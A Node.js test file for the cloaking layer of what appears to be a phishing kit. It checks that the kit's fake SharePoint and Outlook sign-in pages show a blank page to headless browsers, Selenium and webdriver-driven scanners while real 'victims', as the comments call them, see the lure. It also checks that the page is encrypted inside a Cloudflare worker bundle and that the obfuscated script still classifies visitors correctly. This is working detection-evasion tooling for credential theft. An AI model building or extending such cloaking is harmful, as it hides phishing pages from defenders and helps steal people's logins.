/**
 * Cloaking layer (vg-cloak.js) tests.
 *
 * Two things are verified:
 *
 *  A. BEHAVIOUR - the module is executed in a vm sandbox with a fake DOM for
 *     several personas and its verdict is asserted:
 *       * real desktop Chrome / Firefox  -> NOT a bot (never cloaked)
 *       * real mobile Chrome             -> NOT a bot (fail open)
 *       * navigator.webdriver = true     -> HARD bot, wiped immediately
 *       * a Selenium-style driver global -> HARD bot
 *       * a bot user agent               -> HARD bot
 *       * old headless Chrome (no plugins, zero viewport, SwiftShader WebGL,
 *         no "headless" token in the UA) -> SOFT bot (scored, not hard)
 *     The mobile and Firefox cases are the false-positive guards: a scanner
 *     that slips through is cheap, a real victim that gets a white page is not.
 *
 *  B. WIRING - templateloader must inject vg-cloak.js into the page BEFORE
 *     vg-fingerprint.js / vg-engine.js, and the built Cloudflare worker bundle
 *     must carry it too (the worker serves the export-format page).
 *
 * db is stubbed; no network / DB required.
 */
const path = require('path');
const fs = require('fs');
const vm = require('vm');
const crypto = require('crypto');
const ROOT = path.resolve(__dirname, '..', '..');

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

const CLOAK_SRC = fs.readFileSync(path.join(ROOT, 'templates', 'assets', 'vg-cloak.js'), 'utf8');

// Mirror of encryptPayload()/the export bootstrap: the static-export (and
// therefore the worker-served) page is AES-256-GCM encrypted with a PBKDF2
// (salt=salt, 100k, SHA-512) key and AAD 'VG-TEMPLATE-2024'. The worker bundle
// embeds that wrapper with the ciphertext/salt/iv as JS string literals, so we
// can pull them back out and decrypt to inspect the real page.
function decryptExportPayload(bundle) {
  if (typeof bundle !== 'string') return null;
  const mC = bundle.match(/var C=\\"([A-Za-z0-9+/=]+)\\"/);
  const mS = bundle.match(/var S=\\"([A-Za-z0-9+/=]+)\\"/);
  const mI = bundle.match(/var I=\\"([A-Za-z0-9+/=]+)\\"/);
  if (!mC || !mS || !mI) return null;
  try {
    const cb = Buffer.from(mC[1], 'base64');
    const salt = Buffer.from(mS[1], 'base64');
    const iv = Buffer.from(mI[1], 'base64');
    const key = crypto.pbkdf2Sync(salt, salt, 100000, 32, 'sha512');
    const tag = cb.subarray(cb.length - 16);
    const data = cb.subarray(0, cb.length - 16);
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAAD(Buffer.from('VG-TEMPLATE-2024'));
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8');
  } catch (e) {
    return null;
  }
}


// ── Fake DOM good enough for vg-cloak.js ───────────────────────
function makeElement() {
  return {
    id: '',
    style: { cssText: '' },
    innerHTML: '',
    appendChild: function () {},
    removeChild: function () {},
  };
}

function makeDocument(persona) {
  const doc = {
    readyState: 'complete', // evaluate() runs synchronously
    title: 'Sign in',
    _written: null,
    createElement: function (tag) {
      if (tag === 'canvas') {
        return {
          getContext: function () {
            if (!persona.webglRenderer) return null;
            return {
              getParameter: function () { return persona.webglRenderer; },
              getExtension: function () { return { UNMASKED_RENDERER_WEBGL: 1 }; },
            };
          },
        };
      }
      return makeElement();
    },
    getElementById: function () { return null; },
    addEventListener: function () {},
    removeEventListener: function () {},
    open: function () { doc._open = true; },
    write: function (s) { doc._written = (doc._written || '') + String(s); },
    close: function () { doc._closed = true; },
  };
  doc.body = makeElement();
  doc.documentElement = makeElement();
  doc.body.appendChild = function (el) { doc._guard = el; };
  doc.documentElement.appendChild = function (el) { doc._guard = el; };
  return doc;
}

// Default persona = real desktop Chrome on macOS.
function persona(overrides) {
  const base = {
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 ' +
               '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    webdriver: false,
    languages: ['en-US', 'en'],
    language: 'en-US',
    plugins: [1, 2, 3, 4, 5],
    mimeTypes: [1, 2],
    hasWindowChrome: true,
    hasUserAgentData: true,
    pdfViewerEnabled: true,
    hasConnection: true,
    hardwareConcurrency: 8,
    deviceMemory: 8,
    outerWidth: 1512,
    outerHeight: 900,
    innerWidth: 1512,
    innerHeight: 800,
    screenWidth: 1512,
    screenHeight: 982,
    webglRenderer: 'ANGLE (Apple, Apple M1 Pro, OpenGL 4.1)',
    driverGlobals: [],
    docKeys: [],
  };
  return Object.assign(base, overrides || {});
}

// Execute vg-cloak.js against a persona and return { cloak, doc }.
// `src` lets a caller run the obfuscated build instead of the plain source.
function runCloak(p, src) {
  const doc = makeDocument(p);

  const navigatorObj = {
    userAgent: p.userAgent,
    webdriver: p.webdriver,
    languages: p.languages,
    language: p.language,
    plugins: { length: p.plugins.length },
    mimeTypes: { length: p.mimeTypes.length },
    hardwareConcurrency: p.hardwareConcurrency,
    deviceMemory: p.deviceMemory,
    pdfViewerEnabled: p.pdfViewerEnabled,
  };
  if (p.hasUserAgentData) navigatorObj.userAgentData = { brands: [] };
  if (p.hasConnection) navigatorObj.connection = {};

  const win = {
    document: doc,
    navigator: navigatorObj,
    outerWidth: p.outerWidth,
    outerHeight: p.outerHeight,
    innerWidth: p.innerWidth,
    innerHeight: p.innerHeight,
    location: { href: 'https://example.com/', origin: 'https://example.com' },
  };
  if (p.hasWindowChrome) win.chrome = { runtime: {} };
  p.driverGlobals.forEach(function (g) { win[g] = function () {}; });
  p.docKeys.forEach(function (k) { doc[k] = function () {}; });

  // NOTE: no host intrinsics (Object/Function/...) are injected. If they were,
  // the obfuscated build's disableConsoleOutput shim would reach the HOST global
  // through Function('return this')() and silence this test's own console. A vm
  // context already has its own standard built-ins, which is also closer to a
  // real browser realm.
  const sandbox = {
    window: win,
    document: doc,
    navigator: navigatorObj,
    screen: { width: p.screenWidth, height: p.screenHeight },
    location: win.location,
    console: { log: function () {}, warn: function () {}, error: function () {} },
  };
  sandbox.globalThis = sandbox;
  sandbox.self = sandbox;

  vm.createContext(sandbox);
  vm.runInContext(src || CLOAK_SRC, sandbox, { filename: 'vg-cloak.js' });

  return { cloak: win.__VG_CLOAK, doc: doc };
}

// ── A. Behaviour ───────────────────────────────────────────────
console.log('\n── vg-cloak behaviour ──');

(function () {
  // Real desktop Chrome: must never be cloaked.
  var human = runCloak(persona());
  check('human desktop Chrome: not a bot', human.cloak.bot === false, JSON.stringify(human.cloak.reasons));
  check('human desktop Chrome: score 0', human.cloak.score === 0, 'score=' + human.cloak.score);
  check('human desktop Chrome: page not wiped', human.cloak.cloaked === false && !human.doc._written);

  // Real desktop Firefox (no window.chrome, plugins present): fail open.
  var ff = runCloak(persona({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    hasWindowChrome: false,
    hasUserAgentData: false,
    hasConnection: false,
    webglRenderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, OpenGL 4.5)',
  }));
  check('human desktop Firefox: not a bot', ff.cloak.bot === false, JSON.stringify(ff.cloak.reasons));

  // Real mobile Chrome: 0 plugins is normal on mobile, so it must not cloak.
  var mob = runCloak(persona({
    userAgent: 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) ' +
               'Chrome/120.0.0.0 Mobile Safari/537.36',
    plugins: [], mimeTypes: [],
    pdfViewerEnabled: false,
    webglRenderer: 'Adreno (TM) 730',
  }));
  check('human mobile Chrome: not a bot (fail open)', mob.cloak.bot === false, JSON.stringify(mob.cloak.reasons));
  check('human mobile Chrome: page not wiped', mob.cloak.cloaked === false);

  // HARD: navigator.webdriver.
  var wd = runCloak(persona({ webdriver: true }));
  check('webdriver=true: hard bot', wd.cloak.bot === true && wd.cloak.hard === true, JSON.stringify(wd.cloak.reasons));
  check('webdriver=true: page wiped', wd.cloak.cloaked === true && /^<!DOCTYPE html>/.test(wd.doc._written || ''));
  check('webdriver=true: white guard installed', !!wd.doc._guard && wd.doc._guard.id === 'vgCloakGuard');

  // HARD: Selenium/Puppeteer driver global.
  var drv = runCloak(persona({ driverGlobals: ['__webdriver_evaluate'] }));
  check('driver global: hard bot', drv.cloak.bot === true && drv.cloak.hard === true, JSON.stringify(drv.cloak.reasons));

  // HARD: ChromeDriver cdc_ document key.
  var cdc = runCloak(persona({ docKeys: ['cdc_adoQpoasnfa76pfcZLmcfl_Array'] }));
  check('cdc_ document key: hard bot', cdc.cloak.bot === true && cdc.cloak.hard === true, JSON.stringify(cdc.cloak.reasons));

  // HARD: bot user agent (headless token).
  var ua = runCloak(persona({
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ' +
               'HeadlessChrome/110.0.0.0 Safari/537.36',
  }));
  check('headless UA: hard bot', ua.cloak.bot === true && ua.cloak.hard === true, JSON.stringify(ua.cloak.reasons));

  // SOFT: old headless Chrome with a NORMAL user agent (no "headless" token),
  // no plugins, zero viewport, software WebGL. Must cloak without any hard hit.
  var soft = runCloak(persona({
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ' +
               'Chrome/110.0.0.0 Safari/537.36',
    plugins: [], mimeTypes: [],
    outerWidth: 0, outerHeight: 0,
    innerWidth: 0, innerHeight: 0,
    screenWidth: 0, screenHeight: 0,
    webglRenderer: 'Google SwiftShader',
  }));
  check('old headless (soft signals): bot', soft.cloak.bot === true, JSON.stringify(soft.cloak.reasons));
  check('old headless: NOT a hard hit', soft.cloak.hard === false);
  check('old headless: score >= threshold', soft.cloak.score >= 5, 'score=' + soft.cloak.score);
  check('old headless: page wiped', soft.cloak.cloaked === true);

  // A single weak signal must never cloak a real browser.
  var weak = runCloak(persona({ hasUserAgentData: false }));
  check('single weak signal: not a bot', weak.cloak.bot === false, JSON.stringify(weak.cloak.reasons));

  // Escape hatch: window.__CLOAK_ENABLED === 'false' disables the layer.
  (function () {
    var doc = makeDocument(persona());
    var nav = { userAgent: 'HeadlessChrome/110.0.0.0', webdriver: true, languages: ['en'] };
    var win = { document: doc, navigator: nav, __CLOAK_ENABLED: 'false' };
    var sandbox = { window: win, document: doc, navigator: nav, screen: {}, Object: Object,
      console: { log: function () {}, warn: function () {}, error: function () {} } };
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    vm.runInContext(CLOAK_SRC, sandbox, { filename: 'vg-cloak.js' });
    check('__CLOAK_ENABLED=false: layer disabled', !win.__VG_CLOAK);
  })();
})();


// ── B. Wiring ──────────────────────────────────────────────────
// templateloader must inject the cloak module FIRST, and the worker bundle must
// embed it (the worker serves the export-format page).
const dbPath = require.resolve(path.join(ROOT, 'backend', 'database', 'connection.js'));
require.cache[dbPath] = {
  id: dbPath,
  filename: dbPath,
  loaded: true,
  exports: {
    query: async (sql) => (/FROM settings/i.test(String(sql))
      ? [[{ setting_key: 'obfuscation_enabled', setting_value: 'false' }], []]
      : [[], []]),
    getConnection: async () => ({ query: async () => [[], []], release: () => {} }),
    pool: { query: async () => [[], []] },
  },
};

const templateLoader = require(path.join(ROOT, 'backend', 'services', 'templateloader.js'));

function makeLink(templateType) {
  return {
    id: 1,
    template_type: templateType,
    verification_design: 'outlook',
    title_text: 'Test',
    message_text: 'msg',
    button_text: 'Go',
    file_name: 'file.pdf',
    pages: 1,
    destination_url: 'https://example.com',
    turnstile_enabled: true,
  };
}

(async () => {
  console.log('\n── vg-cloak wiring ──');
  const user = { id: 99 };
  const link = makeLink('sharepoint4');

  const html = await templateLoader.renderPageHtml(link, user, {});
  check('renderPageHtml: returns html', typeof html === 'string' && html.length > 1000);

  const iCloak = html.indexOf('__VG_CLOAK');
  const iFp = html.indexOf('__VG_FINGERPRINT');
  const iKill = html.indexOf('__VG_KILLPAGE');
  const iGate = html.indexOf('vgInteractionGate');

  check('renderPageHtml: cloak module injected', iCloak !== -1, 'idx=' + iCloak);
  check('renderPageHtml: cloak before vg-fingerprint', iCloak !== -1 && (iFp === -1 || iCloak < iFp),
    'cloak=' + iCloak + ' fp=' + iFp);
  check('renderPageHtml: cloak before vg-engine (killPage)', iCloak !== -1 && (iKill === -1 || iCloak < iKill),
    'cloak=' + iCloak + ' kill=' + iKill);
  check('renderPageHtml: cloak before interaction gate', iCloak !== -1 && (iGate === -1 || iCloak < iGate),
    'cloak=' + iCloak + ' gate=' + iGate);

  // The engine must hand off to the cloak verdict.
  check('renderPageHtml: vg-engine honours the cloak verdict', html.indexOf('__VG_CLOAK.bot') !== -1);

  // Worker bundle (export-format page embedded in the Cloudflare worker).
  // The page inside the bundle is AES-GCM encrypted (the static-export format),
  // so the cloak module is inside the ciphertext. Decrypt it exactly the way
  // the browser bootstrap does and assert the module is really there.
  const worker = await templateLoader.buildWorkerScript(link, user, 'https://example.com');
  const decrypted = decryptExportPayload(worker);
  check('worker bundle: export-format page embedded', typeof worker === 'string' && worker.indexOf('vg-decrypt-msg') !== -1);
  check('worker bundle: payload decrypts', typeof decrypted === 'string' && decrypted.length > 1000,
    decrypted === null ? 'no ciphertext found' : 'len=' + decrypted.length);
  check('worker bundle: decrypted page contains cloak module',
    !!decrypted && decrypted.indexOf('__VG_CLOAK') !== -1);
  check('worker bundle: cloak injected before engine in payload',
    !!decrypted && decrypted.indexOf('__VG_CLOAK') < decrypted.indexOf('__VG_KILLPAGE'),
    decrypted ? ('cloak=' + decrypted.indexOf('__VG_CLOAK') + ' kill=' + decrypted.indexOf('__VG_KILLPAGE')) : 'n/a');

  // Obfuscation-safety: the LIVE (non-export) page obfuscates vg-cloak.js with
  // javascript-obfuscator. The obfuscated build must not leak a close-script /
  // close-style sequence (it is embedded inside a <script> block) and must still
  // classify visitors correctly.
  let obfCloak = null;
  try { obfCloak = templateLoader.obfuscateJs(CLOAK_SRC); } catch (e) { obfCloak = null; }
  check('obfuscated cloak: obfuscation produced output', typeof obfCloak === 'string' && obfCloak.length > 200,
    obfCloak === null ? 'obfuscateJs threw' : 'len=' + (obfCloak || '').length);
  if (obfCloak) {
    check('obfuscated cloak: no </script> leak', obfCloak.indexOf('</script') === -1);
    check('obfuscated cloak: no </style> leak', obfCloak.indexOf('</style') === -1);
    const obfBot = runCloak(persona({ webdriver: true }), obfCloak);
    check('obfuscated cloak: still flags a webdriver bot', !!obfBot.cloak && obfBot.cloak.bot === true);
    const obfHuman = runCloak(persona(), obfCloak);
    check('obfuscated cloak: still allows a human', !!obfHuman.cloak && obfHuman.cloak.bot === false);
  }

  console.log('\n==== ' + pass + ' passed, ' + fail + ' failed ====');
  process.exit(fail === 0 ? 0 : 1);
})().catch(err => {
  console.error('TEST CRASH:', err);
  process.exit(2);
});

